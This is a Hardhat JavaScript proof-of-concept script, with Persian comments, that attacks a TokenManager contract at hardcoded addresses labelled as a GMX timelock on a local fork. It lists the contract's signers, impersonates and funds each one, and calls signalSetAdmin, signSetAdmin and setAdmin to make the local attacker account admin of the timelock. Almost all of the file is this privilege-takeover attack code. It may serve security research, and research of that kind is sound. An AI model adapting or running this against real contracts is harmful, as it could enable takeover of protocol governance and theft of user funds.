// poc_tokenmanager_setadminh.js
// PoC helper script: تلاش برای signal/sign/setAdmin روی TokenManager (فورک لوکال Hardhat).
// اجرا: npx hardhat run poc_tokenmanager_setadminh.js --network localhost

const { ethers, network } = require("hardhat");
const fs = require("fs");
const path = require("path");

const OUT_TX_TRACE = path.join(__dirname, "tx_trace.json");
const OUT_SUMMARY = path.join(__dirname, "poc_summary.json");

function writeJsonSafe(p) {
  try {
    fs.writeFileSync(p.path, JSON.stringify(p.obj, null, 2));
  } catch (e) {
    // fallback
    fs.writeFileSync(p.path, JSON.stringify(p.obj, null, 2));
  }
}

function appendTrace(entry) {
  let arr = [];
  try {
    if (fs.existsSync(OUT_TX_TRACE)) arr = JSON.parse(fs.readFileSync(OUT_TX_TRACE));
  } catch (e) { arr = []; }
  arr.push(entry);
  fs.writeFileSync(OUT_TX_TRACE, JSON.stringify(arr, null, 2));
}

function saveSummary(k, v) {
  let obj = {};
  try {
    if (fs.existsSync(OUT_SUMMARY)) obj = JSON.parse(fs.readFileSync(OUT_SUMMARY));
  } catch (e) { obj = {}; }
  obj[k] = v;
  fs.writeFileSync(OUT_SUMMARY, JSON.stringify(obj, null, 2));
}

function shortErr(e) {
  try {
    return e && e.reason ? e.reason : (e && e.message ? e.message : String(e));
  } catch (x) { return String(e); }
}

async function toChecksumMaybe(addr) {
  if (!addr) throw new Error("empty address");
  try { return ethers.utils.getAddress(addr); } catch (e) {
    // try lowercase
    try { return ethers.utils.getAddress(addr.toLowerCase()); } catch (e2) {
      throw new Error(`Invalid address provided: ${addr}`);
    }
  }
}

async function main() {
  console.log("=== PoC: TokenManager.setAdmin flow (local fork) ===");

  const [local] = await ethers.getSigners();
  console.log("Local signer:", local.address);
  saveSummary("local_attacker", local.address);

  // read env or defaults (use lowercase defaults to avoid checksum issues)
  const envTM = process.env.TOKEN_MANAGER;
  const envTL = process.env.GMX_TIMELOCK;

  const DEFAULT_TOKEN_MANAGER = "0x4e29d2ee6973e5bd093df40ef9d0b28bd56c9e4e";
  const DEFAULT_GMX_TIMELOCK = "0xb87a436b93ffe9d75c5cfa7debe9a2c3a6eb26e2";

  let TOKEN_MANAGER_RAW = envTM || DEFAULT_TOKEN_MANAGER;
  let GMX_TIMELOCK_RAW = envTL || DEFAULT_GMX_TIMELOCK;

  let TOKEN_MANAGER, GMX_TIMELOCK;
  try {
    TOKEN_MANAGER = await toChecksumMaybe(TOKEN_MANAGER_RAW);
    GMX_TIMELOCK = await toChecksumMaybe(GMX_TIMELOCK_RAW);
  } catch (e) {
    console.error("❌ Address parsing failed:", shortErr(e));
    appendTrace({ type: "fatal", error: shortErr(e), timestamp: new Date().toISOString() });
    process.exit(1);
  }

  console.log("TokenManager:", TOKEN_MANAGER);
  console.log("GmxTimelock:", GMX_TIMELOCK);
  saveSummary("tokenManager", TOKEN_MANAGER);
  saveSummary("gmx_timelock", GMX_TIMELOCK);

  const tmAbi = [
    "function actionsNonce() view returns (uint256)",
    "function signalSetAdmin(address,address) external",
    "function signSetAdmin(address,address,uint256) external",
    "function setAdmin(address,address,uint256) external",
    "function signers(uint256) view returns (address)",
    "function isSigner(address) view returns (bool)"
  ];

  const tmProvider = new ethers.Contract(TOKEN_MANAGER, tmAbi, ethers.provider);
  const tm = tmProvider.connect(local);

  // 1) read nonce
  let nonce;
  try {
    nonce = (await tmProvider.actionsNonce()).toNumber();
    console.log("actionsNonce (read):", nonce);
    saveSummary("actionsNonce", nonce);
  } catch (err) {
    console.log("actionsNonce() not available or reverted:", shortErr(err));
    appendTrace({ type: "fatal", error: "cannot read actionsNonce", detail: shortErr(err), timestamp: new Date().toISOString() });
    // continue? usually need nonce; abort
    process.exit(1);
  }

  // 2) discover signers
  const signers = [];
  for (let i = 0; i < 20; i++) {
    try {
      const s = await tmProvider.signers(i);
      if (!s || s === ethers.constants.AddressZero) break;
      const cs = await toChecksumMaybe(s);
      signers.push(cs);
    } catch (err) {
      break;
    }
  }
  console.log("discovered signers:", signers);
  saveSummary("discoveredSigners", signers);
  saveSummary("discoveredSignersCount", signers.length);

  // 3) probe via callStatic
  console.log("\n=== Probing actions (callStatic) ===");
  const ATTACKER = local.address;
  const targetNonce = nonce + 1;
  saveSummary("targetNonce", targetNonce);

  const probes = [
    { name: "signalSetAdmin", fn: async () => tmProvider.callStatic.signalSetAdmin(GMX_TIMELOCK, ATTACKER) },
    { name: "signSetAdmin", fn: async () => tmProvider.callStatic.signSetAdmin(GMX_TIMELOCK, ATTACKER, targetNonce) },
    { name: "setAdmin", fn: async () => tmProvider.callStatic.setAdmin(GMX_TIMELOCK, ATTACKER, targetNonce) }
  ];

  for (const p of probes) {
    try {
      await p.fn();
      console.log(`- ${p.name} -> callStatic ok`);
      saveSummary(`callStatic_${p.name}`, "ok");
    } catch (callErr) {
      console.log(`- ${p.name} -> callStatic reverted:`, shortErr(callErr));
      saveSummary(`callStatic_${p.name}`, shortErr(callErr));
      appendTrace({ type: "callStatic", name: p.name, error: shortErr(callErr), timestamp: new Date().toISOString() });
    }
  }

  console.log("\n=== Attempting actual PoC steps (impersonate signers if possible) ===");

  // 4) try signalSetAdmin from local (provider signer)
  try {
    const tx1 = await tm.signalSetAdmin(GMX_TIMELOCK, ATTACKER);
    const r1 = await tx1.wait();
    console.log("signalSetAdmin tx:", tx1.hash);
    appendTrace({ type: "tx", name: "signalSetAdmin", txHash: tx1.hash, receipt: { status: r1.status, gasUsed: r1.gasUsed.toString(), blockNumber: r1.blockNumber }, timestamp: new Date().toISOString() });
  } catch (err) {
    console.log("signalSetAdmin failed or not permitted (provider):", shortErr(err));
    appendTrace({ type: "error", name: "signalSetAdmin", error: shortErr(err), timestamp: new Date().toISOString() });
  }

  // 5) impersonate signers and try signSetAdmin
  if (signers.length === 0) {
    console.log("No signers discovered; cannot impersonate.");
    appendTrace({ type: "info", msg: "no signers", timestamp: new Date().toISOString() });
  } else {
    console.log("Impersonating discovered signers and trying signSetAdmin...");
    for (let i = 0; i < signers.length; i++) {
      const s = signers[i];
      try {
        console.log("-> impersonate", s);
        await network.provider.request({ method: "hardhat_impersonateAccount", params: [s] });

        // fund signer (if needed) from local
        try {
          const funder = (await ethers.getSigners())[0];
          await funder.sendTransaction({ to: s, value: ethers.utils.parseEther("0.5") });
        } catch (ferr) {
          // ignore funding errors
        }

        const signer = await ethers.getSigner(s);
        const tmSigner = tm.connect(signer);

        // callStatic test
        try {
          await tmSigner.callStatic.signSetAdmin(GMX_TIMELOCK, ATTACKER, targetNonce);
          console.log(`  callStatic signSetAdmin ok for signer ${s}`);
          appendTrace({ type: "callStaticSignOk", signer: s, timestamp: new Date().toISOString() });
        } catch (csErr) {
          console.log(`  callStatic signSetAdmin reverted for ${s} :`, shortErr(csErr));
          appendTrace({ type: "callStaticSignErr", signer: s, error: shortErr(csErr), timestamp: new Date().toISOString() });
        }

        // attempt real tx
        try {
          const tx = await tmSigner.signSetAdmin(GMX_TIMELOCK, ATTACKER, targetNonce);
          const rec = await tx.wait();
          console.log(`  signed by ${s} tx: ${tx.hash} (status ${rec.status})`);
          appendTrace({ type: "tx", name: "signSetAdmin", signer: s, txHash: tx.hash, receipt: { status: rec.status, gasUsed: rec.gasUsed.toString(), blockNumber: rec.blockNumber }, timestamp: new Date().toISOString() });
        } catch (txErr) {
          console.log(`  impr sign failed for ${s}`, shortErr(txErr));
          appendTrace({ type: "error", name: "signSetAdmin", signer: s, error: shortErr(txErr), timestamp: new Date().toISOString() });
        }

        await network.provider.request({ method: "hardhat_stopImpersonatingAccount", params: [s] });
      } catch (impErr) {
        console.log("  error during impersonation for", s, shortErr(impErr));
        appendTrace({ type: "error", name: "impersonation", signer: s, error: shortErr(impErr), timestamp: new Date().toISOString() });
        try { await network.provider.request({ method: "hardhat_stopImpersonatingAccount", params: [s] }); } catch (e) {}
      }
    }
  }

  // 6) attempt final setAdmin
  try {
    console.log("Attempting setAdmin(...) with targetNonce:", targetNonce);
    const tx2 = await tm.setAdmin(GMX_TIMELOCK, ATTACKER, targetNonce);
    const r2 = await tx2.wait();
    console.log("setAdmin tx:", tx2.hash, "status:", r2.status);
    appendTrace({ type: "tx", name: "setAdmin", txHash: tx2.hash, receipt: { status: r2.status, gasUsed: r2.gasUsed.toString(), blockNumber: r2.blockNumber }, timestamp: new Date().toISOString() });
  } catch (err) {
    console.log("setAdmin reverted or failed:", shortErr(err));
    appendTrace({ type: "error", name: "setAdmin", error: shortErr(err), timestamp: new Date().toISOString() });
  }

  // 7) try read timelock admin after
  try {
    const tlAbi = ["function admin() view returns (address)", "function gov() view returns (address)", "function timelock() view returns (address)"];
    let got = null;
    for (const a of tlAbi) {
      try {
        const name = a.match(/function\s+(\w+)\(/)[1];
        const tl = new ethers.Contract(GMX_TIMELOCK, [a], ethers.provider);
        const v = await tl[name]();
        got = { fn: name, val: v };
        console.log("Timelock read", name, "=", v);
        appendTrace({ type: "timelock_read", fn: name, val: v, timestamp: new Date().toISOString() });
        break;
      } catch (e) { /* try next */ }
    }
    if (!got) {
      console.log("Could not read timelock admin AFTER (maybe no admin() view).");
      appendTrace({ type: "timelock_read_failed", timestamp: new Date().toISOString() });
    }
  } catch (e) {
    console.log("Timelock read failed:", shortErr(e));
    appendTrace({ type: "error", name: "timelock_read", error: shortErr(e), timestamp: new Date().toISOString() });
  }

  console.log("\n=== PoC run finished ===");
  saveSummary("finishedAt", new Date().toISOString());
}

main()
  .then(() => process.exit(0))
  .catch((e) => {
    console.error("Fatal error:", e);
    appendTrace({ type: "fatal", error: String(e), timestamp: new Date().toISOString() });
    process.exit(1);
  });

